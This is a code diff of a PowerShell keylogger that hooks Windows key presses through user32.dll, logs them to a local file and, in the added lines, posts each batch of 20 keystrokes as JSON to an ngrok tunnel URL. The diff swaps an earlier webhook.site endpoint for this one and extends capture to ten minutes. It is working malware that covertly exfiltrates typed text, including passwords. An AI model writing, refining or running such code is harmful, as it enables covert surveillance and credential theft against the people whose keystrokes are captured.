@@ -1,3 +1,4 @@
+
 # Signatures for Windows API calls
 $signatures = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -18,8 +19,9 @@ if ($null -eq $API) {
     exit
 }
 
+$uri = "https://1f37-27-4-137-234.ngrok-free.app/receive-data"
+$headers = @{"Content-Type" = "application/json"}
 $outputFilePath = "C:\Users\keylog.txt"
-$webhookUrl = "https://webhook.site/<>"
 $keyCount = 0
 $keyBuffer = @()
 $startTime = Get-Date
@@ -27,7 +29,7 @@ $startTime = Get-Date
 # Loop to capture key presses
 while ($true) {
     # Check if 10 minutes elapsed
-    if ((Get-Date) -ge ($startTime.AddMinutes(1))) {
+    if ((Get-Date) -ge ($startTime.AddMinutes(10))) {
         Write-Host "10 minutes elapsed. Stopping keylogger."
         break
     }
@@ -59,17 +61,23 @@ while ($true) {
 
                 # Check if 20 key presses reached
                 if ($keyCount -eq 20) {
-                    # Convert key buffer to string
-                    $keyBufferString = $keyBuffer -join "`r`n"
+                    # Convert key buffer to string without new lines
+                    $keyBufferString = $keyBuffer -join ""
 
-                    # Send captured text to webhook
-                    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $keyBufferString -ContentType "text/plain"
+                    # Write captured text to file
+                    Add-Content -Path $outputFilePath -Value $keyBufferString
 
-                    Write-Host "Data sent to webhook."
+                    Write-Host "Data written to file."
 
                     # Reset key count and buffer
                     $keyCount = 0
                     $keyBuffer = @()
+
+                    # Send data to URI
+                    $body = @{"keylog" = $keyBufferString} | ConvertTo-Json
+
+                    Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body
+                    Write-Host "Data sent to URI."
                 }
             }
         }
